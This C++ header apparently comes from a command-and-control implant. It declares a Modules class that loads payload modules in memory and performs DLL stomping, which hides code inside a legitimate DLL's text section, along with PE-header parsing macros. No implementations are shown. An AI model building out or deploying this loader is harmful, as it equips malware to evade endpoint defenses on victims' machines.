#pragma once
#include <windows.h>
#include "agent/core.h"

#define DOS_HEADER(base) ((PIMAGE_DOS_HEADER)(base))
#define NT_HEADERS(base) ((PIMAGE_NT_HEADERS)((PBYTE)(base) + DOS_HEADER(base)->e_lfanew))
#define OPT_HEADER(base) (&NT_HEADERS(base)->OptionalHeader)
#define FILE_HEADER(base) (&NT_HEADERS(base)->FileHeader)
#define SECTION_HEADER(base) ((PIMAGE_SECTION_HEADER)((PBYTE)&NT_HEADERS(base)->OptionalHeader + FILE_HEADER(base)->SizeOfOptionalHeader))
#define RVA2VA(type, base, rva) ((type)((PBYTE)(base) + (rva)))

#define PAGE_ALIGN(x) (((SIZE_T)(x) + 0xFFF) & ~(SIZE_T)0xFFF);

class Modules {
private:
	INT64 LoadModulesBitMap;
	BOOL IsStompedDllLoaded;


	PVOID StompedDllText;
	SIZE_T StompedDllTextSize;
	PVOID TextSectionIndex;

	PVOID ReserveArena(SIZE_T size);
	
	

public:
	static void* operator new(SIZE_T size) {
		void* ptr = kratos->apis.LocalAlloc(ALLOC_ARGS, size);
		if ( ! ptr ) { return NULL; }
		return ptr;
	}

	//Modules() { this->LoadModulesBitMap = 0; /*this->IsStompedDllLoaded = FALSE;*/ }
	BOOL IsModuleLoaded(INT32 bit);
	BOOL LoadModule(PBYTE Module, SIZE_T ModuleSize, INT32 ModuleBit);
	BOOL LoadStompedDll( );
	BOOL GetStompedDllText(PVOID DllBase);

	INT64 GetLoadedModulesBitMap();

};


extern Modules* modules;